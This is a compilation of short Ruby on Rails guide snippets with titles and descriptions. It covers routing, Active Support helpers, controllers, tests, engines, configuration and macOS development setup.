LANGUAGE: ruby
CODE:
test "renders HTML" do
  article = Article.create!(title: "Hello, world")

  render partial: "articles/article", locals: { article: article }

  assert_pattern { rendered_html.at("main h1") => { content: "Hello, world" } }
end

test "renders JSON" do
  article = Article.create!(title: "Hello, world")

  render formats: :json, partial: "articles/article", locals: { article: article }

  assert_pattern { rendered_json => { title: "Hello, world" } }
end

----------------------------------------

TITLE: Adding Sprockets-Rails to Gemfile for Rails 7.0
DESCRIPTION: Code snippet showing how to add the sprockets-rails gem to your Gemfile if your application still needs to use Sprockets, which is now an optional dependency in Rails 7.0.

LANGUAGE: ruby
CODE:
gem "sprockets-rails"

----------------------------------------

TITLE: Using String Date/Time Conversion Methods in Ruby on Rails
DESCRIPTION: These methods convert strings into Date, Time, or DateTime objects, providing convenient wrappers around Date._parse. The to_time method can accept a timezone parameter.

LANGUAGE: ruby
CODE:
"2010-07-27".to_date              # => Tue, 27 Jul 2010
"2010-07-27 23:37:00".to_time     # => 2010-07-27 23:37:00 +0200
"2010-07-27 23:37:00".to_datetime # => Tue, 27 Jul 2010 23:37:00 +0000

----------------------------------------

TITLE: Using in? Method for Inclusion Testing
DESCRIPTION: Demonstrates the in? method which tests if an object is included in another object that responds to include?.

LANGUAGE: ruby
CODE:
1.in?([1, 2])        # => true
"lo".in?("hello")   # => true
25.in?(30..50)      # => false
1.in?(1)            # => ArgumentError

----------------------------------------

TITLE: Adding SSL Configuration to Kamal Deployment
DESCRIPTION: YAML configuration snippet for enabling SSL with a custom domain in the Kamal deployment configuration.

LANGUAGE: yaml
CODE:
proxy:
  ssl: true
  host: app.example.com

----------------------------------------

TITLE: HTML Output for select_year Helper
DESCRIPTION: The HTML output generated by the select_year helper, showing a select box with years around the specified year. The name attribute is namespaced with the specified prefix.

LANGUAGE: html
CODE:
<select id="party_year" name="party[year]">
  <option value="2019">2019</option>
  <option value="2020">2020</option>
  <option value="2021">2021</option>
  <option value="2022">2022</option>
  <option value="2023">2023</option>
  <option value="2024" selected="selected">2024</option>
  <option value="2025">2025</option>
  <option value="2026">2026</option>
  <option value="2027">2027</option>
  <option value="2028">2028</option>
  <option value="2029">2029</option>
</select>

----------------------------------------

TITLE: Creating Model Records in Rails Console
DESCRIPTION: Example of using Rails console to create Group records in the database. Creates two groups with different names to populate the application with sample data.

LANGUAGE: ruby
CODE:
irb> Group.create(name: "Rails Founders")
irb> Group.create(name: "Rails Contributors")

----------------------------------------

TITLE: Demonstrating button_to helper behavior in ERB templates
DESCRIPTION: Shows how the button_to helper renders different HTML elements depending on how content is passed to it, illustrating the behavior when config.action_view.button_to_generates_button_tag is false.

LANGUAGE: erb
CODE:
<%= button_to "Content", "/" %>
# => <input type="submit" value="Content">

<%= button_to "/" do %>
  Content
<% end %>
# => <button type="submit">Content</button>

----------------------------------------

TITLE: Using Parametric Scope Route Helpers in Rails
DESCRIPTION: Shows how to use the path and URL helpers generated by parametric scopes. The helper methods accept objects as parameters and construct the appropriate parametric URLs.

LANGUAGE: ruby
CODE:
account_article_path(@account, @article) # => /1/article/9
url_for([@account, @article])            # => /1/article/9
form_with(model: [@account, @article])   # => <form action="/1/article/9" ...>

----------------------------------------

TITLE: Subscribing to Multiple Instances of a Channel in JavaScript
DESCRIPTION: Example showing how a consumer can subscribe to multiple instances of the same channel with different parameters. This code creates subscriptions to two different chat rooms.

LANGUAGE: javascript
CODE:
// app/javascript/channels/chat_channel.js
import consumer from "./consumer"

consumer.subscriptions.create({ channel: "ChatChannel", room: "1st Room" })
consumer.subscriptions.create({ channel: "ChatChannel", room: "2nd Room" })

----------------------------------------

TITLE: Cloning the Ruby on Rails Repository with Git
DESCRIPTION: Commands to clone the Rails GitHub repository and navigate to the project directory. This is the first step in setting up a local Rails development environment.

LANGUAGE: bash
CODE:
$ git clone https://github.com/rails/rails.git
$ cd rails

----------------------------------------

TITLE: Swapping Middlewares in Rails Application Configuration
DESCRIPTION: Shows how to swap one middleware for another in a Rails application using the config.middleware.swap method. This example replaces the default exception handler with a custom one.

LANGUAGE: ruby
CODE:
# config/application.rb

# Replace ActionDispatch::ShowExceptions with Lifo::ShowExceptions
config.middleware.swap ActionDispatch::ShowExceptions, Lifo::ShowExceptions

----------------------------------------

TITLE: Using fetch with Strong Parameters in Rails
DESCRIPTION: This example shows how to handle the case when a parameter might not exist, such as in a 'new' action. It uses the fetch method to supply a default empty hash and then applies the permit method to it.

LANGUAGE: ruby
CODE:
# using `fetch` you can supply a default and use
# the Strong Parameters API from there.
params.fetch(:blog, {}).permit(:title, :author)

----------------------------------------

TITLE: Using the advance method with Date objects in Ruby on Rails
DESCRIPTION: The advance method provides a generic way to jump to other days by supplying a hash with keys for years, months, weeks, and days. Increments can be positive or negative.

LANGUAGE: ruby
CODE:
date = Date.new(2010, 6, 6)
date.advance(years: 1, weeks: 2)  # => Mon, 20 Jun 2011
date.advance(months: 2, days: -2) # => Wed, 04 Aug 2010

----------------------------------------

TITLE: Installing Ruby Development Environment on macOS
DESCRIPTION: This snippet shows how to set up a Ruby development environment on macOS by installing Xcode Command Line Tools, Homebrew, required dependencies, and the Mise version manager to install Ruby 3.

LANGUAGE: bash
CODE:
# Install Xcode Command Line Tools
$ xcode-select --install

# Install Homebrew and dependencies
$ /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
$ echo 'export PATH="/opt/homebrew/bin:$PATH"' >> ~/.zshrc
$ source ~/.zshrc
$ brew install openssl@3 libyaml gmp rust

# Install Mise version manager
$ curl https://mise.run | sh
$ echo 'eval "$(~/.local/bin/mise activate)"' >> ~/.zshrc
$ source ~/.zshrc

# Install Ruby globally with Mise
$ mise use -g ruby@3

----------------------------------------

TITLE: Cache Write Example Payload in Active Support
DESCRIPTION: Example of the payload data available during a cache_write.active_support event. This shows the cache key and store class name.

LANGUAGE: ruby
CODE:
{
  key: "name-of-complicated-computation",
  store: "ActiveSupport::Cache::MemCacheStore"
}

----------------------------------------

TITLE: Setting Global Path Name Changes with scope in Rails Routes
DESCRIPTION: Demonstrates how to apply path name changes uniformly across multiple routes using a scope block. This approach allows consistent path naming conventions throughout your application.

LANGUAGE: ruby
CODE:
scope path_names: { new: "make" } do
  # rest of your routes
end

----------------------------------------

TITLE: Configuring secrets.yml in Rails 4.1
DESCRIPTION: Example of a secrets.yml configuration file that stores the application's secret_key_base and custom API keys. Values can be accessed via Rails.application.secrets in the application.

LANGUAGE: yaml
CODE:
development:
  secret_key_base: 3b7cd727ee24e8444053437c36cc66c3
  some_api_key: SOMEKEY

----------------------------------------

TITLE: Checking Range Inclusion with === and include? in Rails
DESCRIPTION: Rails extends the Range#=== and Range#include? methods to handle range arguments, checking whether the ends of the argument range belong to the receiver range.

LANGUAGE: ruby
CODE:
(2..3).include?(Math::E) # => true

LANGUAGE: ruby
CODE:
(1..10) === (3..7)  # => true
(1..10) === (0..7)  # => false
(1..10) === (3..11) # => false
(1...9) === (3..9)  # => false

(1..10).include?(3..7)  # => true
(1..10).include?(0..7)  # => false
(1..10).include?(3..11) # => false
(1...9).include?(3..9)  # => false

----------------------------------------

TITLE: Rendering Without a Layout in Rails
DESCRIPTION: Example showing how to render a view without using any layout by setting the layout option to false.

LANGUAGE: ruby
CODE:
render layout: false

----------------------------------------

TITLE: Adding Member Routes with Block Syntax in Rails
DESCRIPTION: Defines custom member routes within a resources block using the member block. This adds routes that operate on individual resource instances, making the resource ID available as params[:id].

LANGUAGE: ruby
CODE:
resources :photos do
  member do
    get "preview"
  end
end

----------------------------------------

TITLE: Creating a Branch for Rails Development
DESCRIPTION: Creates a dedicated branch for development work on Rails. This isolates your changes from the main codebase until they're ready to be submitted.

LANGUAGE: bash
CODE:
$ cd rails
$ git checkout -b my_new_branch

----------------------------------------

TITLE: Namespaced Helper Definition in a Rails Engine
DESCRIPTION: Example of a namespaced helper module in a Rails engine. The ArticlesHelper is defined within the Blorgh module to prevent conflicts with the main application or other engines.

LANGUAGE: ruby
CODE:
module Blorgh
  module ArticlesHelper
    # ...
  end
end

----------------------------------------

TITLE: Running a Specific Migration Version with db:migrate:up
DESCRIPTION: This command runs a specific migration up to the specified version. It executes the change or up method for the migration with the given version number.

LANGUAGE: bash
CODE:
$ bin/rails db:migrate:up VERSION=20240428000000

----------------------------------------

TITLE: Correct Capitalization and Punctuation in Ruby Comments
DESCRIPTION: Shows the proper way to format comments with proper capitalization and punctuation to maintain professional documentation style.

LANGUAGE: ruby
CODE:
# BAD
# declares an attribute reader backed by an internally-named
# instance variable

# GOOD
# Declares an attribute reader backed by an internally-named
# instance variable.

----------------------------------------

TITLE: Navigating to the Rails Application Directory
DESCRIPTION: Command to change the current directory to the newly created Rails application folder for further development work.

LANGUAGE: bash
CODE:
$ cd store

----------------------------------------

TITLE: Using String to_time with Timezone Options in Ruby on Rails
DESCRIPTION: The to_time method can accept a timezone parameter (:utc or :local) to specify which timezone the resulting Time object should use. The default is :local.

LANGUAGE: ruby
CODE:
"2010-07-27 23:42:00".to_time(:utc)   # => 2010-07-27 23:42:00 UTC
"2010-07-27 23:42:00".to_time(:local) # => 2010-07-27 23:42:00 +0200

----------------------------------------

TITLE: Generating a Product Model
DESCRIPTION: Command to create a Product model with a name attribute of type string. This generates the model, migration, and test files.

LANGUAGE: bash
CODE:
$ bin/rails generate model Product name:string

----------------------------------------

TITLE: Testing Show Action in Rails Controller
DESCRIPTION: This test verifies that the show action of an ArticlesController correctly displays an article. It fetches an article from fixtures and checks that the response is successful.

LANGUAGE: ruby
CODE:
test "should show article" do
  article = articles(:one)
  get article_url(article)
  assert_response :success
end

----------------------------------------

TITLE: Configuring Browser Version Guard with Modern Browsers Support
DESCRIPTION: Example of configuring application-wide browser version guard to allow only modern browsers that support specific features like webp images, web push, badges, import maps, and CSS nesting.

LANGUAGE: ruby
CODE:
class ApplicationController < ActionController::Base
  # Allow only browsers natively supporting webp images, web push, badges, import maps, CSS nesting + :has
  allow_browser versions: :modern
end

----------------------------------------

TITLE: Loading All Extensions for a Class in Ruby on Rails
DESCRIPTION: How to load all the extensions for a specific class (in this case Hash) in Active Support.

LANGUAGE: ruby
CODE:
require "active_support"
require "active_support/core_ext/hash"

----------------------------------------

TITLE: API-focused GroupsController Implementation in Rails
DESCRIPTION: Complete controller code for handling CRUD operations on a Group resource in an API-only Rails application. Each action renders JSON responses with appropriate status codes.

LANGUAGE: ruby
CODE:
# app/controllers/groups_controller.rb
class GroupsController < ApplicationController
  before_action :set_group, only: %i[ show update destroy ]

  # GET /groups
  def index
    @groups = Group.all

    render json: @groups
  end

  # GET /groups/1
  def show
    render json: @group
  end

  # POST /groups
  def create
    @group = Group.new(group_params)

    if @group.save
      render json: @group, status: :created, location: @group
    else
      render json: @group.errors, status: :unprocessable_entity
    end
  end

  # PATCH/PUT /groups/1
  def update
    if @group.update(group_params)
      render json: @group
    else
      render json: @group.errors, status: :unprocessable_entity
    end
  end

  # DELETE /groups/1
  def destroy
    @group.destroy
  end

  private
    # Use callbacks to share common setup or constraints between actions.
    def set_group
      @group = Group.find(params[:id])
    end

    # Only allow a list of trusted parameters through.
    def group_params
      params.expect(group: [:name])
    end
end

----------------------------------------

TITLE: Defining Plural Forms for Model Names in Rails I18n
DESCRIPTION: Shows how to define singular and plural forms for model names in YAML configuration files for use with ActiveRecord models.

LANGUAGE: yaml
CODE:
en:
  activerecord:
    models:
      user:
        one: Customer
        other: Customers

----------------------------------------

TITLE: Using present? in HTTP Cache Control in Ruby on Rails
DESCRIPTION: Example from ActionDispatch showing how to use the present? method to check if a Cache-Control header exists.

LANGUAGE: ruby
CODE:
def set_conditional_cache_control!
  unless self["Cache-Control"].present?
    # ...
  end
end

----------------------------------------

TITLE: Migrating from ActiveSupport::Dependencies Constantize to String Method
DESCRIPTION: Shows how to replace the deprecated ActiveSupport::Dependencies.constantize method with the String#constantize method.

LANGUAGE: ruby
CODE:
ActiveSupport::Dependencies.constantize("User") # NO LONGER POSSIBLE
"User".constantize # ð

----------------------------------------

TITLE: Conditionally Displaying Custom Flash Messages in Rails Views
DESCRIPTION: ERB code that checks for a custom flash key and displays a welcome message. This shows how to use custom flash keys for conditional content rendering.

LANGUAGE: erb
CODE:
<% if flash[:just_signed_up] %>
  <p class="welcome">Welcome to our site!</p>
<% end %>

----------------------------------------

TITLE: Correct Usage of Rails Callback Blocks Without return
DESCRIPTION: Example of refactoring a callback block to evaluate to the desired value instead of using return. This approach is recommended in Rails 4.1+.

LANGUAGE: ruby
CODE:
class ReadOnlyModel < ActiveRecord::Base
  before_save { false } # GOOD
end

----------------------------------------

TITLE: Basic Engine Class for Full Engine
DESCRIPTION: Default engine initialization file created when using the --full option, defining the core engine class.

LANGUAGE: ruby
CODE:
module Blorgh
  class Engine < ::Rails::Engine
  end
end

----------------------------------------

TITLE: Date and Time Form Fields in Rails
DESCRIPTION: Demonstrates various date and time related form fields including date, time, datetime-local, month, and week inputs. These specialized fields provide appropriate UI controls for date/time selection.

LANGUAGE: erb
CODE:
<%= form.date_field :born_on %>
<%= form.time_field :started_at %>
<%= form.datetime_local_field :graduation_day %>
<%= form.month_field :birthday_month %>
<%= form.week_field :birthday_week %>

LANGUAGE: html
CODE:
<input type="date" name="born_on" id="born_on">
<input type="time" name="started_at" id="started_at">
<input type="datetime-local" name="graduation_day" id="graduation_day">
<input type="month" name="birthday_month" id="birthday_month">
<input type="week" name="birthday_week" id="birthday_week">

----------------------------------------

TITLE: Adding Custom Asset Paths to Propshaft Configuration
DESCRIPTION: Ruby code snippet showing how to add additional asset paths to Propshaft's configuration via the config.assets.paths setting in initializers/assets.rb.

LANGUAGE: ruby
CODE:
# Add additional assets to the asset load path.
Rails.application.config.assets.paths << Emoji.images_path

----------------------------------------

TITLE: Extracting Hash Keys with extract! in Rails
DESCRIPTION: The extract! method removes and returns the key/value pairs matching the given keys. It preserves the class of the original hash in the returned result, including ActiveSupport::HashWithIndifferentAccess if applicable.

LANGUAGE: ruby
CODE:
hash = { a: 1, b: 2 }
rest = hash.extract!(:a) # => {:a=>1}
hash                     # => {:b=>2}

LANGUAGE: ruby
CODE:
hash = { a: 1, b: 2 }.with_indifferent_access
rest = hash.extract!(:a).class
# => ActiveSupport::HashWithIndifferentAccess

----------------------------------------

TITLE: Using Instance-Level respond_to in Rails Controllers
DESCRIPTION: Demonstrates how to use the instance-level respond_to method for format-specific responses in controllers. This functionality remains unchanged in Rails 4.2.

LANGUAGE: ruby
CODE:
# app/controllers/users_controller.rb

class UsersController < ApplicationController
  def show
    @user = User.find(params[:id])
    respond_to do |format|
      format.html
      format.json { render json: @user }
    end
  end
end

----------------------------------------

TITLE: Declaring Encrypted Attributes in an Active Record Model
DESCRIPTION: Basic example of how to declare an encrypted attribute in a Rails model. This uses the default non-deterministic encryption.

LANGUAGE: ruby
CODE:
class Article < ApplicationRecord
  encrypts :title
end

----------------------------------------

TITLE: Registering an Error Subscriber with Rails Error Reporter
DESCRIPTION: How to register a custom subscriber with the Rails error reporter. This subscribes the instance to receive error reports.

LANGUAGE: ruby
CODE:
Rails.error.subscribe(ErrorSubscriber.new)

----------------------------------------

TITLE: Configuring Custom Message Serializer in Ruby on Rails
DESCRIPTION: This snippet demonstrates how to configure a custom message serializer for ActiveSupport by setting the message_serializer configuration to use YAML. This affects how ActiveSupport::MessageEncryptor and ActiveSupport::MessageVerifier serialize and deserialize data.

LANGUAGE: ruby
CODE:
config.active_support.message_serializer = YAML

----------------------------------------

TITLE: Configuring File-based Logging for Autoloaders
DESCRIPTION: Sets up a custom logger for Rails autoloaders to log their activity to a specific file instead of standard output, useful for detailed autoloading diagnostics.

LANGUAGE: ruby
CODE:
Rails.autoloaders.logger = Logger.new("#{Rails.root}/log/autoloading.log")

----------------------------------------

TITLE: Demonstrating String#humanize Method in Ruby on Rails
DESCRIPTION: Examples showing how humanize transforms attribute names into human-readable form by handling underscores, IDs, and capitalization.

LANGUAGE: ruby
CODE:
"name".humanize                         # => "Name"
"author_id".humanize                    # => "Author"
"author_id".humanize(capitalize: false) # => "author"
"comments_count".humanize               # => "Comments count"
"_id".humanize                          # => "Id"

----------------------------------------

TITLE: Generating Product Mailer in Rails
DESCRIPTION: Command to generate a mailer for handling product notifications.

LANGUAGE: bash
CODE:
$ bin/rails g mailer Product in_stock

----------------------------------------

TITLE: Original Engine Model Definition
DESCRIPTION: Shows the original implementation of an engine model that might need to be overridden by the host application.

LANGUAGE: ruby
CODE:
# Blorgh/app/models/blorgh/article.rb
module Blorgh
  class Article < ApplicationRecord
    # ...
  end
end

----------------------------------------

TITLE: Adding Member Routes with :on Option in Rails
DESCRIPTION: Defines a member route using the :on option as a shorthand alternative to the block syntax. This creates the same route functionality but with a more concise syntax.

LANGUAGE: ruby
CODE:
resources :photos do
  get "preview", on: :member
end

----------------------------------------

TITLE: Configuring JSON-based Cookie Serialization in Rails
DESCRIPTION: Initializer code to configure cookie serialization to use the hybrid format in Rails 4.1, which migrates existing Marshal-serialized cookies to the new JSON-based format transparently.

LANGUAGE: ruby
CODE:
Rails.application.config.action_dispatch.cookies_serializer = :hybrid

----------------------------------------

TITLE: Configuring System Tests to Use Firefox
DESCRIPTION: This configuration changes the browser used by Selenium in system tests from Chrome (default) to Firefox. It modifies the application_system_test_case.rb file.

LANGUAGE: ruby
CODE:
require "test_helper"

class ApplicationSystemTestCase < ActionDispatch::SystemTestCase
  driven_by :selenium, using: :firefox
end

----------------------------------------

TITLE: Example Asset Manifest JSON Structure
DESCRIPTION: Example of a .manifest.json file that maps original asset filenames to their fingerprinted versions, used by Rails to resolve asset paths at runtime.

LANGUAGE: json
CODE:
{
  "application.css": "application-6d58c9e6e3b5d4a7c9a8e3.css",
  "application.js": "application-2d4b9f6c5a7c8e2b8d9e6.js",
  "logo.png": "logo-f3e8c9b2a6e5d4c8.png",
  "favicon.ico": "favicon-d6c8e5a9f3b2c7.ico"
}

----------------------------------------

TITLE: Setting HTTP Location Header in Rails Render
DESCRIPTION: Example of using the :location option with render to set the HTTP Location header, often used in responses that create a new resource.

LANGUAGE: ruby
CODE:
render xml: photo, location: photo_url(photo)

----------------------------------------

TITLE: Pluralizing Strings in Ruby
DESCRIPTION: Shows the pluralize method which returns the plural form of words, handling irregular plurals and uncountable nouns correctly.

LANGUAGE: ruby
CODE:
"table".pluralize     # => "tables"
"ruby".pluralize      # => "rubies"
"equipment".pluralize # => "equipment"

----------------------------------------

TITLE: Defining Application Controller Hierarchy in Rails
DESCRIPTION: Creating a controller inheritance structure with ApplicationController as the base class, AdminController inheriting from it, and a namespaced ProductsController inheriting from AdminController.

LANGUAGE: ruby
CODE:
# app/controllers/application_controller.rb
class ApplicationController < ActionController::Base
end

LANGUAGE: ruby
CODE:
# app/controllers/admin_controller.rb
class AdminController < ApplicationController
end

LANGUAGE: ruby
CODE:
# app/controllers/admin/products_controller.rb
class Admin::ProductsController < AdminController
  def index
  end
end

----------------------------------------

TITLE: Generating User Model in Rails Application
DESCRIPTION: Creates a User model with a name string attribute in the host Rails application to be used by the engine for article authorship.

LANGUAGE: bash
CODE:
$ bin/rails generate model user name:string

----------------------------------------

TITLE: Creating Table with UUID Foreign Key References in Rails
DESCRIPTION: A migration example showing how to create a table with UUID primary keys and foreign key references. This ensures that both primary and foreign keys use the same UUID data type for consistency.

LANGUAGE: ruby
CODE:
create_table :posts, id: :uuid do |t|
  t.references :author, type: :uuid, foreign_key: true
  # Other columns...
  t.timestamps
end

----------------------------------------

TITLE: Extending Template Functionality with source_paths Method
DESCRIPTION: Advanced usage example showing how to extend the template functionality by overriding the source_paths method to include the template's location for relative path operations.

LANGUAGE: ruby
CODE:
def source_paths
  [__dir__]
end

----------------------------------------

TITLE: Setting New Framework Defaults in Rails Configuration
DESCRIPTION: Shows how to define new default values for framework configuration in the load_defaults method. This is part of the Rails versioning system for configuration defaults.

LANGUAGE: ruby
CODE:
def load_defaults(target_version)
  case target_version.to_s
  when "7.1"
    # ...
    if respond_to?(:active_job)
      active_job.existing_behavior = false
    end
    # ...
  end
end

----------------------------------------

TITLE: Generating HTML Rails Guides with Rake
DESCRIPTION: Commands for generating the HTML version of Ruby on Rails Guides documentation using Rake tasks. Shows basic usage and special environment variables for customization.

LANGUAGE: bash
CODE:
$ bundle exec rake guides:generate

LANGUAGE: bash
CODE:
$ bundle exec rake guides:generate:html

----------------------------------------

TITLE: Using underscore with Namespaced Constants in Ruby on Rails
DESCRIPTION: Example showing how underscore handles namespaced class names, converting double colons to slashes to produce filesystem paths.

LANGUAGE: ruby
CODE:
"Backoffice::Session".underscore # => "backoffice/session"

----------------------------------------

TITLE: Basic Product Model Definition in Rails
DESCRIPTION: Simplified Active Record model class definition for a Product. This inherits from ApplicationRecord to gain all Active Record functionality without additional code.

LANGUAGE: ruby
CODE:
class Product < ApplicationRecord
end

----------------------------------------

TITLE: Setting Up Dev Container with Podman
DESCRIPTION: Commands to initialize, start, and use a development container using Podman instead of Docker. This provides an alternative containerized environment for Rails development.

LANGUAGE: bash
CODE:
$ podman machine init
$ podman machine start
$ tools/devcontainer up

----------------------------------------

TITLE: Tracking Attribute Change Details with _change in Rails
DESCRIPTION: Demonstrates the [attr_name]_change method which returns an array with [original_value, new_value] if the attribute has changed, or nil otherwise.

LANGUAGE: irb
CODE:
irb> person.first_name_change
=> [nil, "John Doe"]
irb> person.last_name_change
=> nil

----------------------------------------

TITLE: Logging Fragment Cache in Rails Controllers
DESCRIPTION: Example of verbose format output when fragment cache logging is enabled. Shows the read and write operations with timing details for fragment caching in views.

LANGUAGE: ruby
CODE:
Read fragment views/v1/2914079/v1/2914079/recordings/70182313-20160225015037000000/d0bdf2974e1ef6d31685c3b392ad0b74 (0.6ms)
Rendered messages/_message.html.erb in 1.2 ms [cache hit]
Write fragment views/v1/2914079/v1/2914079/recordings/70182313-20160225015037000000/3b4e249ac9d168c617e32e84b99218b5 (1.1ms)
Rendered recordings/threads/_thread.html.erb in 1.5 ms [cache miss]

----------------------------------------

TITLE: Using attr_internal in Rails Views
DESCRIPTION: Shows how Rails uses attr_internal for view attributes to avoid potential naming conflicts with user-defined instance variables.

LANGUAGE: ruby
CODE:
module ActionView
  class Base
    attr_internal :captures
    attr_internal :request, :layout
    attr_internal :controller, :template
  end
end

----------------------------------------

TITLE: RESTful File Downloads with respond_to in Rails
DESCRIPTION: Shows how to implement RESTful file downloads by using respond_to to serve different formats based on the requested extension. The example allows clients to receive HTML or PDF versions of a resource.

LANGUAGE: ruby
CODE:
class ClientsController < ApplicationController
  # The user can request to receive this resource as HTML or PDF.
  def show
    @client = Client.find(params[:id])

    respond_to do |format|
      format.html
      format.pdf { render pdf: generate_pdf(@client) }
    end
  end
end

----------------------------------------

TITLE: HTML with Embedded Action Text Attachment
DESCRIPTION: Example of rich text content with an embedded action-text-attachment element referencing a User instance via signed GlobalID.

LANGUAGE: html
CODE:
<p>Hello, <action-text-attachment sgid="BAh7CEkiCGâ¦"></action-text-attachment>.</p>

----------------------------------------

TITLE: Adding Object#in? Method in Ruby
DESCRIPTION: Added a new instance method 'in?' to the Object class that allows testing if an object is included in another object, providing a more intuitive syntax for containment checks.

LANGUAGE: ruby
CODE:
Object#in?

----------------------------------------

TITLE: Using composite_identify in Fixtures for Composite Foreign Keys
DESCRIPTION: Shows how to use the composite_identify method to create fixture data for a model with composite foreign keys.

LANGUAGE: yml
CODE:
# book_orders.yml
alices_adventure_in_wonderland_in_books:
  author: lewis_carroll
  book_id: <%= ActiveRecord::FixtureSet.composite_identify(
              :alices_adventure_in_wonderland, Book.primary_key)[:id] %>
  shop: book_store
  order_id: <%= ActiveRecord::FixtureSet.composite_identify(
              :books, Order.primary_key)[:id] %>

----------------------------------------

TITLE: Registering Mail Preview Interceptors in Ruby
DESCRIPTION: Demonstrates how to register interceptor classes that will be called before mail is previewed in the development environment.

LANGUAGE: ruby
CODE:
config.action_mailer.preview_interceptors = ["MyPreviewMailInterceptor"]

----------------------------------------

TITLE: Capturing Template Content with capture in Rails
DESCRIPTION: The capture method extracts part of a template into a variable for later use. It allows storing generated markup to reuse in templates, layouts, or helpers.

LANGUAGE: html+erb
CODE:
<% @greeting = capture do %>
  <p>Welcome! The date and time is <%= Time.current %></p>
<% end %>

LANGUAGE: html+erb
CODE:
<html>
  <head>
    <title>Welcome!</title>
  </head>
  <body>
    <%= @greeting %>
  </body>
</html>

LANGUAGE: ruby
CODE:
@greeting
# => "Welcome to my shiny new web page! The date and time is 2018-09-06 11:09:16 -0500"

----------------------------------------

TITLE: Updating ArticlesController to Permit Author Name Parameter
DESCRIPTION: Modifies the article_params method in the engine's ArticlesController to permit the new author_name parameter from the form.

LANGUAGE: ruby
CODE:
def article_params
  params.expect(article: [:title, :text, :author_name])
end

----------------------------------------

TITLE: Backporting Changes to Stable Rails Branches
DESCRIPTION: This snippet shows the workflow for backporting changes from main to stable branches. It includes updating the main branch, checking out the stable branch, creating a backport branch, and cherry-picking commits for security fixes and bug fixes.

LANGUAGE: bash
CODE:
$ git checkout main
$ git pull --rebase

----------------------------------------

TITLE: Customizing XML Output with Array#to_xml Options in Rails
DESCRIPTION: Shows how to customize XML output by skipping type attributes when converting ActiveRecord collections to XML. The method accepts builder options like :dasherize that are forwarded to the XML builder.

LANGUAGE: ruby
CODE:
Contributor.limit(2).order(:rank).to_xml(skip_types: true)
# =>
# <?xml version="1.0" encoding="UTF-8"?>
# <contributors>
#   <contributor>
#     <id>4356</id>
#     <name>Jeremy Kemper</name>
#     <rank>1</rank>
#     <url-id>jeremy-kemper</url-id>
#   </contributor>
#   <contributor>
#     <id>4404</id>
#     <name>David Heinemeier Hansson</name>
#     <rank>2</rank>
#     <url-id>david-heinemeier-hansson</url-id>
#   </contributor>
# </contributors>

----------------------------------------

TITLE: Using Idiomatic Rails Patterns in Documentation Examples
DESCRIPTION: Demonstrates how to showcase modern, idiomatic Rails patterns in documentation examples rather than outdated approaches.

LANGUAGE: ruby
CODE:
# BAD
# Book.where('name = ?', "Where the Wild Things Are")
# Book.where('year_published < ?', 50.years.ago)

# GOOD
# Book.where(name: "Where the Wild Things Are")
# Book.where(year_published: ...50.years.ago)

----------------------------------------

TITLE: Finding Subclasses with the subclasses Method in Ruby
DESCRIPTION: Demonstrates how to use the subclasses method to get direct subclasses of a class in an unspecified order, useful for examining class hierarchies programmatically.

LANGUAGE: ruby
CODE:
class C; end
C.subclasses # => []

class B < C; end
C.subclasses # => [B]

class A < B; end
C.subclasses # => [B]

class D < C; end
C.subclasses # => [B, D]

----------------------------------------

TITLE: Verifying Bun Installation
DESCRIPTION: Command to verify that Bun JavaScript runtime and bundler is correctly installed and in your path. The expected output should be a version number like 1.0.0.

LANGUAGE: bash
CODE:
$ bun --version

----------------------------------------

TITLE: Running a Single Test Against All Database Adapters
DESCRIPTION: Shows how to run a specific test file against all configured database adapters. This runs the test with each adapter in sequence.

LANGUAGE: bash
CODE:
$ bundle exec rake TEST=test/cases/associations/has_many_associations_test.rb

----------------------------------------

TITLE: Using except! Method with Ruby Hashes in Rails
DESCRIPTION: The except! method removes specified keys from a hash in place and returns self. It also works with indifferent access hashes, allowing both string and symbol keys to be used interchangeably.

LANGUAGE: ruby
CODE:
{ a: 1, b: 2 }.except!(:a) # => {:b=>2}
{ a: 1, b: 2 }.except!(:c) # => {:a=>1, :b=>2}

LANGUAGE: ruby
CODE:
{ a: 1 }.with_indifferent_access.except!(:a)  # => {}
{ a: 1 }.with_indifferent_access.except!("a") # => {}

----------------------------------------

TITLE: Demonstrating String#singularize Method in Ruby on Rails
DESCRIPTION: Examples showing how the singularize method transforms plural words to singular form, handling regular and irregular words appropriately.

LANGUAGE: ruby
CODE:
"tables".singularize    # => "table"
"rubies".singularize    # => "ruby"
"equipment".singularize # => "equipment"

----------------------------------------

TITLE: Automatically Fixing Code Formatting Issues with RuboCop
DESCRIPTION: Command to run RuboCop with the autocorrect flag to automatically fix formatting issues.

LANGUAGE: bash
CODE:
$ bin/rubocop -a

----------------------------------------

TITLE: Overriding author_class Getter Method
DESCRIPTION: Enhances the author_class getter method to automatically constantize the class name, simplifying its usage throughout the engine.

LANGUAGE: ruby
CODE:
def self.author_class
  @@author_class.constantize
end

----------------------------------------

TITLE: Disabling Metadata Storage in Rails
DESCRIPTION: This configuration shows how to disable Rails' internal metadata storage table for a specific database connection. This is useful when working with shared databases or users without table creation privileges.

LANGUAGE: yaml
CODE:
development:
  adapter: postgresql
  use_metadata_table: false

----------------------------------------

TITLE: Implementing run_initializers Method in Rails for Initialization Process
DESCRIPTION: The run_initializers method that traverses class ancestors looking for initializers, sorts them, and runs them in the correct order.

LANGUAGE: ruby
CODE:
def run_initializers(group = :default, *args)
  return if instance_variable_defined?(:@ran)
  initializers.tsort_each do |initializer|
    initializer.run(*args) if initializer.belongs_to?(group)
  end
  @ran = true
end

----------------------------------------

TITLE: Accessing Instance Variables in Tests
DESCRIPTION: Shows how to access controller, request, and response instance variables in controller tests.

LANGUAGE: ruby
CODE:
class ArticlesControllerTest < ActionDispatch::IntegrationTest
  test "should get index" do
    get articles_url

    assert_equal "index", @controller.action_name
    assert_equal "application/x-www-form-urlencoded", @request.media_type
    assert_match "Articles", @response.body
  end
end

----------------------------------------

TITLE: Setting Up Routes for Customized Model Name in Rails
DESCRIPTION: Shows how to define routes for a model with customized model_name. This allows using simpler path helpers without namespace prefixes.

LANGUAGE: ruby
CODE:
Rails.application.routes.draw do
  resources :profiles
end

----------------------------------------

TITLE: Using New Rendering Methods in Rails
DESCRIPTION: Rails 4.1 adds new rendering methods for different content types including plain text, HTML, and raw body content.

LANGUAGE: ruby
CODE:
render :plain, render :html and render :body

----------------------------------------

TITLE: Checking Anonymous Modules in Ruby
